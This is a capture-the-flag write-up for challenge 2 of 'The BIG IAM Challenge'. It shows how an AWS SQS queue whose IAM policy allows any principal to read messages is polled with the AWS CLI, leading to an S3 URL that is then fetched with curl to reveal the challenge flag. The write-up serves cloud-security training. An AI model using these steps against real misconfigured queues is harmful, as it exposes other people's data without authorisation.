---
tags:
  - IAM
  - Google-Analytics
  - SQS
title: The BIG IAM Challenge - Google Analytics
description: Public queues are risky
reference: https://thebigiamchallenge.com/challenge/2
---

# Challenge

We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?

Join our queue and get the secret flag.

# Solution
## 1. View the provided IAM Policy

This policy allow all to send/receive message to/from the queue `wiz-tbic-analytics-sqs-queue-ca7a1b2`.

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": "*", "Action": [ "sqs:SendMessage", "sqs:ReceiveMessage" ], "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2" } ] }
```

### 2. Try to receive a message from the queue

The Body contains a URL.

```
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

{

    "Messages": [

        {

            "MessageId": "e818babc-8f5d-4bcc-9a13-70081da42996",

            "ReceiptHandle": "AQEB3ZHZRtuEs2sF78zjpKcx8uEMf7Nn5b4ML7hW/r8PwuNRZQp0FF8pLFFsEguAv+lyozVI8VFdAfW4YbpnNJsDII0m6P5EDqLhbFM

EAAp8N0Mm1UDnAR+uHx0nAOMlVDf55+YjCCL2gtVso81bnuyJ1FOALyP/v54n0BGrNR8zHQULb1BRrwNDiGhXYDrQi/DCicyZy5szGSL4vzR6uWkW1rC0q0n8bxCZSr3NLNiD

1Hr0jH2olUDzM8MqSeETgvDwFqns/Xa0DF2/FyfADfP7e2RmBcUZDXrEbpfVh70Yca+d2nh4fl8OtYCdyIsBSJT0eXxLQKoImNgS5z/ua6Rf2rOxU5e6MkYjA1dfYnlmnoJtn

DIYEvUrFxi8tg8UhHmqotWTjMtSO9iXA+LYVQoI56hWZjUSivkpaMwATmgr6uk=",

            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",

            "Body": "{\"URL\": \"[https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html](https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html)\", \"User-Agent\": \"Lynx

/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"

        }

    ]

}
```

### 3. Try to access the analytics-bucket URL


```
> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```